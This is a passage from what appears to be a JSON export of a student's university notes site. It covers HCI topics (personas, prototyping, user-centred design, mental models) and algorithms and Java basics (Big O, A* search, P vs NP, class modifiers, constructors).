generator](https://xtensio.com/user-persona-template/).\n\n![500](notes/images/Screenshot%202022-11-18%20at%2011.46.03.png)\n\n![500](notes/images/Screenshot%202022-11-18%20at%2011.46.19.png)\n\n![500](notes/images/Screenshot%202022-11-18%20at%2011.46.29.png)\n\n### Why?\n---\n- Requirements.\n- Visual design.\n- Quality assurance.\n\n### Using Personas\n---\n- Expectation.\n- Behaviour.\n- Context.\n- Feedback.\n\n### Issues with Personas\n---\n- They are **abstract**: hard to understand abstraction process from user data to persona, so personas come across as lacking critical detail.\n- They are **impersonal**, the personifying details in personas fail to provide a sense of empathy.\n- **Details mislead**, it is difficult to select personal details that do not create a false constraints on the design problem.\n- Personifying details **distract**, they make it hard to focus on the aspects of a persona that are critical for the design problem.\n\n### Benefits of Persona\n---\n- User insight.\n- Process of personification.\n- Constant reminders.\n- Personas vs Real People.\n\n### Minimum Persona\n---\n- Picture.\n- Name.\n- Age.\n- Location.\n- Occupation.\n- Bio-rich story that adds reality.\n\n### Optional Content\n---\n- Educational level.\n- Salary or range.\n- Personal motto.\n- Online activities.\n- Offline activities.\n- Trigger or touchpoint for service.\n- Technical comfort level.\n- Social comfort level.\n- Mobile comfort level.\n- Motivation to use service.\n- User goals.\n\n### Guerilla Personas\n---\nLimited money, limited time: empathy map.\n\n![400](notes/images/Screenshot%202022-11-18%20at%2011.47.24.png)","lastmodified":"2023-09-12T17:33:55.173934459Z","tags":["university/cs2003"]},"/notes/university/year2/cs2003/ue-methods-and-techniques":{"title":"UE Methods and Techniques - Prototyping, Mockups and Wireframes","content":"---\n# The Sketch in Interaction Design\n\nTwo requirements approaches when prototyping an interactive system:\n1.

May mistakenly think a bad design is good.\n\nThe value of prototyping is \"to fail, and fail fast\".\n\n## What is a prototype?\n\nA good definition is: \"building a physical working model of all, or part of the proposed system and using it to identify weaknesses in the understanding of the real requirements.\"\n\nBest practice:\n- Look at social and cognitive effects.\n- Use hands-on testing by users, in realistic scenarios.\n- Use with a design/evaluation methodology integrating prototype testing.\n- Ask: what information is the prototype intended to help elicit?\n\n## What do we use it for?\n\n- Work out details and test them, in ways not possible at level of verbal description.\n- Quickly and cheaply build features of interest, to try them out.\n- Concrete approach, to show user what inputs, intermediate stages and outputs look like.\n- Users can suggest changes, and see if it does what they want.\n\n## Prototyping in the Design Process\n\nE. g. car design:\n- Doodles. (to question)\n- Storyboards/sketches. (to question)\n- Blueprints. (to show and communicate ideas)\n- Scale models. (to show and communicate ideas)\n- Wind tunnel model. (to test etc)\n- Computer model. (to test etc)\n\nUsed for: exploring, testing, recording and communicating design ideas.\n\n## When to prototype?\n\nWhen...\n- The application area is poorly defined.\n- Cost of rejection is very high.\n- Final version is essential to be right 1st time.\n- Requirement to assess impact of change.\n\nIt forces the analyst to visualise all steps and how the interface will operate in practice.\n\nCurrent development systems are flexible, so we need to know what to build as early as possible.\n\n## \"Levels\" of prototyping to support design \n\n1. Product Conceptualisation: allows exploration of alternative designs. **What might the system/application/device actually look like or do?**\n2. Task Level Prototyping: suitability of the design at the level of performing users' tasks. **How can an individual task be performed - what steps are required?**\n3. Screen Design Prototyping: Focus on icons, menus and screen layouts. **What would the screen layouts actually look like, to assess their suitability? Where are the buttons and widgets going to be placed?**\n\n## Economic Principle of Prototyping\n\n\"The best prototyping is one that, in the simplest and most efficient way, makes the possibilities and limitations of a design idea visible and measurable.\"\n\n## Varieties of prototype\n\n- Full prototype vs paper prototype.\n- Horizontal prototype vs vertical prototype.\n- Lo-fi prototype vs hi-fi prototype (and med-fi).\n- Chauffeured prototype.\n- 'Wizard of Oz' prototype.\n\n![](notes/images/Screenshot%202023-02-24%20at%2012.08.36.png)\n\n### Lo-fi prototype\n- Sketches and models focus on the outward appearance and 'feel' of the designed system.\n- Hard to envisage fine interaction details.\n\n### Hi-fi prototype\n- Slow to build.\n- Reluctance to change the design - all that hard work!\n- Testers and reviewers tend to focus on fit and finish issues.\n\n### 'Wizard of Oz' prototype\n- A human intermediary/hidden operator intercepts commands and applies suitable interpretation.\n- It permits early, flaky design (and code) to be tested.\n- It is also used in paper prototyping.\n\n## Wireframing\n\nA common way to plan an interface, similar to blueprints.\n\nEach wireframe represents an individual screen, usually covered in colourless squares with little notes all over them.\n\nIt is a **low fidelity** layout design:\n- Contains the main information.\n- Draws the outline of structure and layout.\n- Visual and description of the user **interface**.\n- Usually **abstracted** from the content.\n\n## Paper prototyping (POP)\n\n### Likely Issues\n- In concepts and terminologies.\n- Navigation problems.\n- Content.\n- Documentation/help.\n- Requirements/functionality.\n- Brand.\n\n![](notes/images/Screenshot%202023-02-24%20at%2012.14.51.png)\n\n### Not Likely Issues\n- Small changes in response to user inputs.\n- Problems from dynamic change.\n- Effects of keystroke or mouse errors.\n- Download or response time issues.\n- Issues from long-term use.\n- Real life contexts.","lastmodified":"2023-09-12T17:33:55.173934459Z","tags":["university/cs2003"]},"/notes/university/year2/cs2003/user-centred-design":{"title":"User-Centred Design","content":"It is important to ensure that we meet users needs, this is what user-centered design is all about.\n\nThe problem with traditional development is that:\n- Software engineering methodologies primarily focus on large, batch processing, non-interactive software systems (functionality and automation).\n- It ignores the role of interactivity and the important of the user. Users are just an input and the end point the output.\n\n## Evolution of Software Development Methodologies\n### Waterfall Model (1970)\n- Popular methodology.\n- Sequential and discreet steps, can't go back.\n- Requirements are written up front.\n\nIssues:\n- Requirements usually from clients and not users.\n- Requirements represented in speech/text.\n- Contract comes before understanding user needs.\n\n### Boehm's Spiral Model (1988)\n- Major improvement.\n- Spiral vs sequential steps.\n- Some flexibility to go back.\n- Each loop is a phase of the software process.\n- Each phase begins with a design goal and ends with client reviewing progress.\n- Incorporates risk management.\n- No user involvement.\n\n![500](notes/images/Screenshot%202022-10-28%20at%2011.32.19.png)\n\n### Agile Approach (2001)\n- Much more flexible.\n- Close collaboration with development team and  business stakeholders.\n\nAgile has four core values:\n1. Individuals and interactions over processes and tools.\n2. Working software over comprehensive documentation.\n3. Customer collaboration over contract negotiation.\n4. Responding to change over following a plan.\n\n## Why bother with Usability Engineering?\nUsability engineering is a discipline that focuses on improving the usability and user friendliness of the interactive systems.\n\nPay a little now, or a pay a lot later.\n\n**63%** of large software projects go over cost, managers gave four usability-related reasons:\n1. Users requested changes.\n2. Overlooked tasks by users/designers (both).\n3. Users did not understand their own requirements.\n4. Insufficient user-developer communication and understanding.\n\nIt is far too easy to jump into detailed design that:\n- Is founded on incorrect requirements.\n- Has inappropriate dialogue flow.\n- Is not easily used.\n- Is never tested until it is too late.\n\nHow can we engineer systems that consider the users? We need to work **with** potential users in an integrated design process.\n\n![450](notes/images/Screenshot%202022-10-28%20at%2011.39.55.png)\n\n## User-Centered Design (UCD)\nUCD approaches:\n- Requirements are clearly understood and articulated.\n- Requirements are communicated to designers.\n- Stakeholders are on board and involved.\n- Evaluation takes place with actual users.\n- User feedback is incorporated into the design.\n- Preparation for handover to client is considered.\n\n**User-centered design** is a 'philosophy' based on needs and interests of the user, emphasising on making the product **usable** and **understandable**.\n\n1. Places user at the centre of the design.\n2. Involves the user.\n3. Integrates knowledge/expertise from different disciplines in HCI.\n4. Highly iterative.\n\n![500](notes/images/Screenshot%202022-10-28%20at%2011.46.21.png)\n\n# User-Centred Design Methods and Techniques\n---\n## Soft Systems Methodology (SSM) 1990's\nIt is a systems methodology: looks a the **whole** system (holistic not reductionist).\n\nEmphasis on **understanding the situation** and solving **complex** problems:\n- Used in early stages of design lifecycle.\n- Used in systems analysis - which recognises the more complex and fuzzy nature of organisational life where a variety of goals are being pursued.\n- Interpretive and subjective approach (opinions sought), not quantitative.\n- User centred: values, beliefs and **views**.\n\nIt only takes analyst up to design, says nothing about implementation or evaluation.\n\n### The Seven Stages of SSM\n![500](notes/images/Screenshot%202022-10-28%20at%2011.54.52.png)\n\n## Usability Engineering Lifecycle (1999)\nIt was designed as a usability test plan and integrated into software development.\n\nIterative model including three phases:\n1. **Requirement analysis** - understand user issues, what tasks users need to do, set goals for usability study.\n2. **Design, testing and development** - conceptual design, project standards, final design.\n3. **Installation** - feedback from users.\n\n![Screenshot 2022-10-28 at 11.57.12](notes/images/Screenshot%202022-10-28%20at%2011.57.12.png)\n\n## Star Lifecycle (1989)\n\nIt was developed by HCI professional and emphasises that ordering of activities is inappropriate.\n\nIt is evaluation centred and encourages iteration. It is also applicable to both small and large projects.\n\n![400](notes/images/Screenshot%202022-10-28%20at%2011.58.24.png)\n\n### Pros and Cons\n- Pros:\n    - It allows designers to match the process to their developing needs, because needs are hard to specify initially (as evaluation directs progress).\n- Cons:\n    - Difficult to control process.\n    - Procedural models (e.g. waterfall) allow developers and managers to get an overall view of the development effort to track progress, specify deliverables, allocate resources and set targets.\n\n## Participatory Design (PD)\nIt brings users to the heart of the design process, they are involved with every stage of the design.\n\nIt came about due to other methods involving users at certain stages of the process only e.g. requirements gathering, evaluation etc.\n\nOther terms: co-creation, co-design, co-operative design.\n\nUsers are the experts - they have knowledge that the designers/developers do not. They also take an active role in co-designing solutions for themselves.\n\nDesigning **for** them vs designing **with** them.\n\n### PD Methods\nAnything goes but often **workshop-based**.\n\nThe aim is to encourage creativity and 'out of the box' thinking.\n\nThere are no fixed approach, methods or tools. It is about using the right combination for the job at hand.\n\nExamples:\n- Brainstorming - Love Letter/Breakup Letter, magic button.\n- Practical - Lego, plasticine, wooden bricks, straws, rope.\n- Understanding process/interaction - journey mapping, storyboards, role play.\n- Technical - sketching, wireframes (low/hi fidelity), prototyping.\n\n### Pros and Cons\n- Pros:\n    - Users' sense of ownership is increased over end product.\n    - More likely to result in system that meets user needs, are usable, feasible and meaningful in their context.\n- Cons:\n    - Can be complex and time consuming.\n    - Not really practical - getting all stakeholders together.\n    - Difficult to accommodate differing needs, desires and requirements from the stakeholders.\n    - Users' and developers thinking is constrained by what they already know.\n    - Need to manage user expectations - not everything will be included in final design.\n\n## Human Centred Design Process - IDEO\nIt is a HCD discipline which starts with people and ends with innovative solutions to match user needs.\n\nIt has three phases:\n1. Inspiration - understand situation and people.\n2. Ideation:\n    - Make sense of what you've learned.\n    - Come up with lots of ideas.\n    - Design, prototype and evaluate, refine and iterate.\n    - Implementation - final solution.\n\n### Design Thinking Process\nDiscipline of design thinking, which originates from design.\n\nPhases:\n1. Empathise - understand context and users.\n2. Define - define problem area.\n3. Prototype - build, evaluate and refine design.\n4. Test - test design with users and refine.\n\nIt is an iterative approach.\n\n### Double Diamond (The British Design 2005)\nDiscipline of design thinking, also originates from design.\n\nStructured design approach to tackle challenges and problems.\n\nIt has four phases:\n- Discover: insight into problem.\n- Define: area to focus on.\n- Develop: potential solutions.\n- Deliver: solutions.\n\nIt is based on the concept of divergent and convergent thinking.\n\n![500](notes/images/Screenshot%202022-10-28%20at%2012.27.11.png)\n### Double Diamond (adapted by Dan Nessler)\n![500](notes/images/Screenshot%202022-10-28%20at%2012.35.21.png)\n\n#### Stage 1 - Doing the Right Thing\nIt has research added to the **Discover** phase (diverging) and synthesis added to the **Define** phase (converging).\n\nDiscover/Research - understanding problem to be addressed:\n- Think 'outside of the box' - rip the design brief.\n- Cluster topics - organise findings, identify areas for focus.\n- Research problems - primary and secondary.\n\nDefine/Synthesis - make sense of findings:\n- Insights gained? What have you learnt?\n- What themes have evolved?\n- Create HMW (how might we) questions.\n\n#### Stage 2 - Doing Things Right\n- Ideation added to **Develop** phase (diverging).\n- Implementation added to **Deliver** phase (converging).\n\nDevelop/Ideation - ideas to address problem:\n- Ideate - come up with lots of ideas (out of the box thinking).\n- Evaluate - evaluate ideas and select best/favourite ones.\n\nDeliver/Implementation - develop final solution:\n- Prototype, test and iterate selected ideas.\n- Repeat.\n- Converge on final solution - out.\n\n![Screenshot 2022-10-28 at 12.59.30](notes/images/Screenshot%202022-10-28%20at%2012.59.30.png)\n\n### Lean UX (User Experience)\nThe aim is to create well designed products.\n\n- Highly collaborative.\n- Involves constant iteration.\n- Frequent contact with users.\n- **Objective** - to get feedback as quickly as possible.\n- **Focus** - user needs and experience.\n- Highly iterative.\n- Compliments **Agile** development.\n\nPhases:\n1. Outcomes - What are your assumptions about the user? Turn assumptions into hypothesis.\n2. Design - design product collaboratively.\n3. MVP - create basic mock-up to use with target users e.g. wireframes, prototype.\n4. Research and Learning - get user feedback on MVP.","lastmodified":"2023-09-12T17:33:55.173934459Z","tags":["university/cs2003"]},"/notes/university/year2/cs2003/user-models-and-conceptual-design":{"title":"User Models and Conceptual Design","content":"# Making Sense of the World\nTransparent objects expose their functions, for example a bicycle.\n\nOpaque objects however, hide their functions.\n\n# Mental Models\nModels people have of themselves, others, their environment and thing with which they interact.\n\nIt is based on **metaphors**.

To predict future events.\n2. To find causes of observed events.\n3. To determine appropriate actions to cause changes.\n\nDesigning good MMs is useful in manipulating user behaviours.\n\nMore examples [here](https://www.deliverableux.com/10-examples-of-mental-models-in-ux-design)\n\n## Application of Mental Models in UE\nGood models **should** help you use machines.\n\nHow can MMs be used in UE/HCI?\n\n1. Helps users develop effective models with appropriate representations in the interface.\n2. Ensure users don't develop inappropriate MMs of devices.\n\n# Conceptual Models\nTerm used to describe the ways systems are **designed** to be understood. It should help the user \"figure it out\".\n\nA good **conceptual** model is a high level description of:\n1. The proposed system in terms of a set of integrated ideas and concepts.\n2. What it should do, behave and look like.\n3. How it should be understood by the users, as intended.\n\n![Screenshot 2022-10-20 at 15.33.32](notes/images/Screenshot%202022-10-20%20at%2015.33.32.png)\n\n## Implications for System Designers\n1. Choose the MM you intend the user to adopt, **before** designing the user interface.\n2. Exploit the system image ('look and feel') to convey the intended MM.\n3. Hide aspects of the system image that conflict with the activity/conceptual model.\n4. Link the choice of MM to the intended means of interaction.\n\n## Doing Conceptual Design\nConceptual design involves:\n- Structuring information space.\n- Creating of alternative solutions.\n- Determining which design concept to pursue.\n\nTools involved in conceptual design:\n- Sketching, brainstorming, card sorting, flowchart, storyboards, scenarios etc.\n- Personas, use cases.","lastmodified":"2023-09-12T17:33:55.173934459Z","tags":["university/cs2003"]},"/notes/university/year2/cs2004/aco-and-pso":{"title":"Ant Colony Optimisation and Particle Swarm Optimisation","content":"---\n# Swarm Intelligence\n---\nThe **interaction** of many simple parts creating **complex** behaviour.

When an ant reaches a node, it uses the pheromone trail to calculate the probability of choosing the next node. This probability is zero for nodes that cannot be reached from the current node, and is similar to Roulette Wheel Selection in Genetic Algorithms.","lastmodified":"2023-09-12T17:33:55.173934459Z","tags":["university/cs2004"]},"/notes/university/year2/cs2004/alan-turing":{"title":"alan-turing","content":"# Alan Turing\n- Alan Mathison Turing\n- 23rd of June 1912 to 7th of June 1954.\n- Mathematician.\n- Pardoned in 2013.\n- Created the concept of a [turing machine](notes/university/year2/cs2004/turing-machines.md).","lastmodified":"2023-09-12T17:33:55.173934459Z","tags":["university/cs2004"]},"/notes/university/year2/cs2004/alg-foundation-analysis":{"title":"Foundation of Algorithm Analysis","content":"- Running time.\n- Pseudo-code.\n- Counting primitive operations.\n\n## Running Time\n---\nVaries with the input and typically grows with the input size.\n\nAn algorithm may run faster on certain data set compared to others.\n\nWe have the following run times:\n- Best case.\n    - Not very informative as it might not happen very often.\n- Worst case.\n    - Easier to analyse, crucial to applications such as traffic control etc.\n- Average case.\n    - Take all inputs, calculate time for all inputs then sum all calculated values and divide by total inputs.\n\nWe can use `System.currentTimeMillis()` for example to get a measure of running time in Java.\n\n### Limitations\n---\n- We would need same software and hardware environments.\n- Sometimes difficult to implement algorithm.\n- One algorithm can perform better than the rest for some inputs.\n\nThe solution is **asymptotic analysis**.\n\n### Asymptotic Analysis\n---\nIt uses a high-level description of the algorithm instead of an implementation.\n\nWe evaluate the performance of an algorithm in terms of input size and calculate how does the time taken by an algorithm increases with the input size.\n\n# T(n)\n---\nWe use it to measure the running time/computation of an algorithm.\n\nWhere **n** is the size of the input, if there is more than one input we might have T(n,m) where **n** and **m** are the sizes of the inputs.\n\nWe can use T(n) to calculate the **[Big O](notes/university/year2/cs2004/big-o-notation.md)**.\n\n# Pseudo-Code\n---\n![Screenshot 2022-09-03 at 22.19.59](notes/images/Screenshot%202022-09-03%20at%2022.19.59.png)\n\nWe do not call functions unless we describe the pseudo-code for them or describe what they do.\n\nFor example, we would not say:\n\n```\nX = Y.toLowerCase();\n```\n\nHowever we could say:\n\n```\nLet X equal the lower case version of Y\n```\n\n## Variables\n---\n![Screenshot 2022-09-03 at 22.22.12](notes/images/Screenshot%202022-09-03%20at%2022.22.12.png)\n\n## If Statements\n---\n![Screenshot 2022-09-03 at 22.22.27](notes/images/Screenshot%202022-09-03%20at%2022.22.27.png)\n\n## For Loops\n---\n![Screenshot 2022-09-03 at 22.22.39](notes/images/Screenshot%202022-09-03%20at%2022.22.39.png)\n\n## Full Example\n---\n![Screenshot 2022-09-03 at 22.22.56](notes/images/Screenshot%202022-09-03%20at%2022.22.56.png)\n\n# Primitive Operations\n---\nThey are basic computations performed by an algorithm, for example:\n\n- Evaluating an expression (x\u003ey)\n- Assigning a value to a variable.\n- Indexing into an array.\n- Calling a method.\n- Returning from a method.\n\n![Screenshot 2022-09-03 at 22.25.34](notes/images/Screenshot%202022-09-03%20at%2022.25.34.png)\n\nThe most difficult part is getting all of the nest loops correct.\n\n![Screenshot 2022-09-03 at 22.34.28](notes/images/Screenshot%202022-09-03%20at%2022.34.28.png)\n\n![Screenshot 2022-09-03 at 22.43.31](notes/images/Screenshot%202022-09-03%20at%2022.43.31.png)\n\n![Screenshot 2022-09-03 at 22.45.28](notes/images/Screenshot%202022-09-03%20at%2022.45.28.png)\n\n- Normally **if statements** have 9 primitive operations.\n\n![Screenshot 2022-09-03 at 22.46.31](notes/images/Screenshot%202022-09-03%20at%2022.46.31.png)\n\n---\n[cs2004-exam](notes/university/year2/cs2004/cs2004-exam.md)","lastmodified":"2023-09-12T17:33:55.173934459Z","tags":["university/cs2004"]},"/notes/university/year2/cs2004/alg-intro":{"title":"Introduction to Algorithms","content":"An algorithm is a set of steps for solving a problem.

which was used to show that the **decision** problem was impossible to solve.\n\nIn 1936 Turing created two concepts: **[turing machine](notes/university/year2/cs2004/turing-machines.md)** and **universal turing machine**.\n\nIn 1939 Turing created a machine called \"The Bombe\" which helped crack the German enigma code. \n\nIn 1948, the first computer (Baby) and associated computer program were developed at Manchester University based on Turing's ideas.\n\n## Computer Science and Computation\n- Discipline that studies computable problems and computational structures.\n- Involves the understanding and design of computers and computational processes.\n- Interdisciplinary.\n\nComputation is the procedure of calculating, determining something by mathematical or logical methods.\n\n**Computability** is about what computers can and cannot do.\n\n### What is a Computer and a Computer program?\nA **computer** is a device for carrying out certain types of algorithms.\n\n**Algorithms** are a set of steps for solving a problem.\n\nA **computer programming language** describes algorithms to computers, and a **computer program** is a description of a single algorithms and/or problem (usually).\n\n**Computer software** is a collection of programs that carry out a similar or related task.\n\n## Next Lecture\n- [Foundation Analysis](notes/university/year2/cs2004/alg-foundation-analysis.md)","lastmodified":"2023-09-12T17:33:55.173934459Z","tags":["university/cs2004"]},"/notes/university/year2/cs2004/algorithms-and-data-structure":{"title":"Algorithms and Data Structure","content":"---\n## Topics\n- [Sets and Maps](notes/university/year2/cs2004/sets-and-maps.md)\n- [Vectors and Arrays](notes/general/vectors-arrays.md)\n- [Big O Notation](notes/university/year2/cs2004/big-o-notation.md)\n- [Lists](notes/general/lists.md)\n- [Stacks and Queues](notes/general/stack.md)\n- [Hash Tables](notes/general/hash-tables.md)\n- [Trees](notes/university/year2/cs2004/trees.md)\n- [Sorting](notes/university/year2/cs2004/sorting.md)\n- [Graphs](notes/university/year2/cs2004/graphs.md)\n    -

Solved in a reasonable amount of time (polynomial time).\n    - For example: multiplication and sorting.\n- NP problems:\n    - Difficult to solve in a reasonable amount of time but easy to **verify** the solution.\n    - Problems involving decision making.\n    - Important class of problems, for example job scheduling, circuit design and vehicle routing.\n\n![|400](notes/images/Screenshot%202022-12-16%20at%2011.40.36.png)\n\n- NP-hard problems:\n    - Very, very difficult to solve problems, which cannot be done in a reasonable amount of time.\n    - They are very difficult to verify in polynomial time.\n- NP-complete problems:\n    - The hardest problems in NP set.\n    - Complexities greater than polynomial time.\n    - Verifiable in polynomial time.\n    - No polynomial-time algorithm is discovered for any NP-complete problem.\n    - Nobody was able to prove that no polynomial-time algorithm exist for any of the problems.\n\nIf a polynomial time algorithm is found for **any** problem in NP-complete then **every** problem in NP can be solved in polynomial time.\n\n![|200](notes/images/Screenshot%202022-12-16%20at%2011.43.26.png)\n\nMore info [here](notes/general/p-vs-np.md) (P vs NP problems).\n\n#### Examples\n---\n- The travelling salesperson problem.\n- Finding the shortest common superstring.\n- Checking whether two finite automate accept the same language.\n- Given three positive integers `a`, `b`, and `c`, do there exist positive integers (`x` and `y`) such that $ax^2 + by^2 = c$.\n","lastmodified":"2023-09-12T17:33:55.173934459Z","tags":["university/cs2004"]},"/notes/university/year2/cs2004/best-first-search":{"title":"Best-First Search","content":"It is an improvement upon [depth-first search](notes/university/year2/cs2004/depth-first-search.md).\n\nA heuristic is used to decide which node is explored next:\n- A **heuristic** is a rule of thumb or best practice.\n\nFor example, nodes are expanded in order of lowest cost.\n\n## A* Search\nVery good for route finding applications:\n- The AA website.\n- The tube.\n\nIt needs **two estimates**:\n- How much a partial path has cost.\n- An estimate (**under estimate**) of how far is left to the goal state, for example lower bound on how far to travel.\n\nIt will find an optimal path without necessarily considering all the routes.\n\nIt scores each partial path with the function $f = g + h$, where $g$ is the **cost so far** and $h$ is the **estimate of the cost to the goal state**.\n- London to Manchester: Land transport 200.21 miles, crow-flies 163.05 miles.\n\nIf $h$ is always zero (we don't have any information about how far away the goal is), then the algorithm becomes similar to [depth-first search](notes/university/year2/cs2004/depth-first-search.md).\n\nIf $g$ is always zero, then the algorithm is called **Greedy Search**.\n- Making locally optimal choices at each stage with the hope of finding the global optimum.\n\n### Example\n![Screenshot 2022-11-07 at 11.41.25](notes/images/Screenshot%202022-11-07%20at%2011.41.25.png)","lastmodified":"2023-09-12T17:33:55.173934459Z","tags":["university/cs2004"]},"/notes/university/year2/cs2004/big-o-notation":{"title":"Big O Notation","content":"# Big O Notation\n---\nIt describes how the performance of an algorithm scales with the size of the problem.\n\n[](notes/private/work/compiler-optimisation.md#Performance|Performance) may be **time to execute** or **amount of memory**.\n\nSize must be a quantitative measure of the scale of the problem.

Every **object** is an instance of a **class**, which defines the **type** of the object and the kind of operations it performs. The **members** of a class are:\n    - Data of objects are stored in **instance variables** (aka **fields**).\n    - Operations can act on data, **methods**.\n\n## Class Modifiers\nAccess control modifiers, meaning they control the level of access (visibility) that the defining class grants to other classes.\n\nThe ability to limit access among classes -\u003e encapsulation.\n\n### Public\nAll classes may access the defined aspect. For example:\n\n```java\npublic class Counter {\n```\n\nAll other classes, such as CounterDemo, are allowed to construct new instances of the Counter class, as well as to declare variables and parameters of type Counter.\n\nEach **public class** must be defined in **a separate file**, class name = `classname.java`.\n\nThe designation of **public** access for a particular method of a class allows any other class to make a call to that method. For example:\n\n```java\npublic int getCount() {\n    return count;\n}\n```\n\nThe CounterDemo class may call `c.getCount()`.\n\nTherefore, if an instance variable is declared as public, dot notation can be used to directly access the variable by code in any other class that possesses a reference to an instance of this class. For example, if Counter is public, CounterDemo would be allowed to read or modify that variable using syntax such as `c.count`.\n\n### Protected\nAccess is only granted to the following groups of other classes:\n\n- **Subclasses** through inheritance.\n- Classes that belong to the same **package**.\n\n### Private\nAccess is only granted within that class, neither subclass nor any other classes have access to such members.\n\nFor example, we defined the count instance variable of the Counter class to have private access level. We were allowed to read or edit its value from within methods of that class (such as getCount, increment, and reset), but other classes such as CounterDemo cannot directly access that field. \n\nOf course, we did provide other public methods to grant outside classes with behaviours that depended on the current count value.\n\n### No control modifier\nThen we default to **package-private** access level.\n\n### Static\nThe class' value is associated with the class as a whole, rather than with each individual instance of that class.\n\nStatic variables are used to store **\"global\"** information about a class. For example, to maintain the total number of instances of that class that have been created. Static variables exist even if no instance of their class exists.\n\nBeing static is **associated with the class itself, and not with a particular instance of the class**. This means that the method is not invoked on a particular instance of the class using the traditional dot notation, instead it uses the name of the class as a qualifier.\n\nFor example, the `java.lang` package has a Math class that provides many static methods, including `sqrt`, square root. To compute a square root, you do not need to create an instance of the Math class, you use `Math.sqrt(2)` for example, with the class name Math as the qualifier before the dot operator.\n\n\"Static methods can be useful for providing utility behaviours related to a class that need not rely on the state of any particular instance of that class.\"\n\n### Abstract\nAny subclass of a class with abstract methods is expect to provide a concrete implementation for each abstract method.\n\nAbstract methods are an advanced feature of object-oriented programming to be combined with inheritance.\n\nA class with one or more abstract methods must also be formally declared as **abstract**, because it is incomplete. As a result, Java won't allow any instances of an abstract class to be constructed, although reference variables may be declared with an abstract type.\n\n### Final\nA variable declared with final can be initialised but can never again be assigned a new value. If it is a base type, then it is a constant. If a reference is final, then it will always refer to the same object. If a member variable of a class is declared as final, it will typically be declared as **static** as well, because it would be unnecessarily wasteful to have every instance store the identical value when that value can be shared by the entire class.\n\nA final method cannot be overridden by a subclass, and a final class cannot even be subclassed.\n\n## Primitive Types (Base Types)\n- Boolean: true or false.\n- Char: 16-bit Unicode character.\n- Byte: 8-bit signed two's complement integer.\n- Short: 16-bit two's complement integer.\n- Int: 32-bit two's complement integer.\n- Long: 64-bit two's complement integer.\n- Float: 32-bit floating-point number.\n- Double: 64-bit floating-point number.\n\nFloating-points constants, like 3.1415, are of type **double** unless followed by an 'F' or 'f'.\n\n```java\npublic class Primitive_Types {\n    public static void main (String[] args) {\n        boolean flag = true;\n        char ch = 'A';\n        byte b = 12;\n        short s = 23;\n        int i = 341;\n        long l = 561L;\n        float f = 3.1415F;\n        double d = 6.4231;\n\n        System.out.println(\"flag = \" + flag);\n        System.out.println(\"ch = \" + ch);\n        System.out.println(\"b = \" + b);\n        System.out.println(\"s = \" + s);\n        System.out.println(\"i = \" + i);\n        System.out.println(\"l = \" + l);\n        System.out.println(\"f = \" + f);\n        System.out.println(\"d = \" + d);\n    }\n}\n```\n\n## Objects\nNew objects are created by using the **new** operator. It creates a new object and returns a **reference** to that object. We must immediately follow our use of the **new** operator by a call to a constructor for that type of object.\n\n![Pasted image 20220814190529](notes/images/Pasted%20image%2020220814190529.png)\n\nThree events occur:\n\n1. New object is dynamically allocated in memory and all instance variables are initialised to standard default values. Default is **null** for object variables and 0 for all base types except **boolean** which is false.\n2. Constructor is called with the parameters specified. It fills in meaningful values for the instance variables and performs any additional computations to create the object.\n3. After constructor returns, the **new** operator returns a reference (memory address) to the newly created object.\n\n## Dot Operator\nEvery object reference variable must refer to some object, unless it is **null**. \n\nAn object can have many references pointing to it, the same one. One of the main uses of an object reference variable is to access the members of the class for this object, for example methods. This access is performed with the dot operator.\n\nA method's name, number and types of parameters is called a method's **signature**. For example:\n\n```java\noven.cookDinner();\noven.cookDinner(food);\noven.cookDinner(food, seasoning);\n```\nEach of these methods calls is referring to a different method with the same name defined in the class that oven belongs to. \n\nThe signature of a method in Java **does not** include the type that the method returns, meaning Java doesn't allow two methods with the same signature to return different types.\n\n## Variable Modifiers\nThe **scope** can be controlled by the following variable modifiers:\n\n1. **public**: anyone can access it.\n2. **protected**: only methods of the same package or of its sub classes can access it.\n3. **private**: only methods of the same class can access it.\n4. If none used then it is **friendly**, meaning anyone in the same package can access.\n\n**Usage modifiers**:\n1. **static**: variable is associated with the class, not with the individual instances of that class. They store **global** information about a class.\n2. **final**: must be assigned an initial value and then can never be assigned a new value after that.\n\n![Pasted image 20220814192407](notes/images/Pasted%20image%2020220814192407.png)\n\n## Enum Types\nEnumerated types. Only allowed to take on values that come from a specified set of names declared inside a class as follows:\n\n```java\nmodifier enum name { val_name0, val_name1, ..., val_namen-1};\n```\n\nwhere the modifier can be blank, public, protected or private. Another example:\n\n```java\npublic enum Day { MON, TUE, WED, THU, FRI, SAT, SUN };\n```\n\n![Pasted image 20220814192633](notes/images/Pasted%20image%2020220814192633.png)\n\n## Return Types\nIf the method doesn't return a value, then we use **void**. If the return type is void, the method is called a **procedure**.\n\n## Parameters\nThey are passed **by value**, meaning that any time we pass a parameter to a method, a copy of that parameter is made for use within the method body. So if we pass an **int** to a method, then that variable's integer value is copied. The method can change the copy but not the original. If we pass an object by reference as a parameter to a method, then the reference is copied as well.\n\n## Constructor\nSpecial kind of method that is used to initialise a newly created instance of the class so that it will be in a consistent and stable initial state. The general syntax is:\n\n```java\nmodifiers name(type, parameter) {\n    // constructor body...\n}\n```\n\n```java\npublic fish (int w, String n) {\n    weight = w;\n    name = n;\n}\n```\n\n1. Constructors cannot be **static**, **abstract** or **final**. Only public, protected, private or default.\n2. The name of the constructor must be identical to the name of the class it constructs. For example, when defining the Counter class, a constructor must be named Counter as well.\n3. We don't specify a **return type** for a constructor, not even **void**. Nor does the body of a constructor explicitly return anything.\n\nA class can have many constructors, but each must have a different **signature**, meaning each must be distinguished by the type and number of the parameters it takes.\n\nConstructors **must** be called using the **new** operator. For example:\n\n```java\nFish myFish = new Fish(8, \"Bob\");\n```\n\nAs an example, our Counter class defines the following pair of constructors: \n\n```java\npublic Counter() { }  \npublic Counter(int initial) { count = initial; }\n```\n\nThe first of these has a trivial body, { }, as the goal for this default constructor is to create a counter with value zero, and that is already the default value of the integer instance variable, count. \n\nHowever, it is still important that we declared such an explicit constructor, because otherwise none would have been provided, given the existence of the non-default constructor. In that scenario, a user would have been unable to use the syntax, `new Counter()`.\n\n## This\nWithin the body of a (non-static) method in Java, the keyword this is automatically defined as a reference to the instance upon which the method was invoked. \n\nThat is, if a caller uses a syntax such as `thing.foo(a, b, c)`, then within the body of method foo for that call, the keyword this refers to the object known as thing in the caller’s context.\n\nWhy we need it from within a method body:\n\n1.

We have need to make sure to multiply it by the nesting value, in our case **n**. \n\nTherefore, there are **9n** operations in total.\n\n---\n```\nAlgorithm 5.

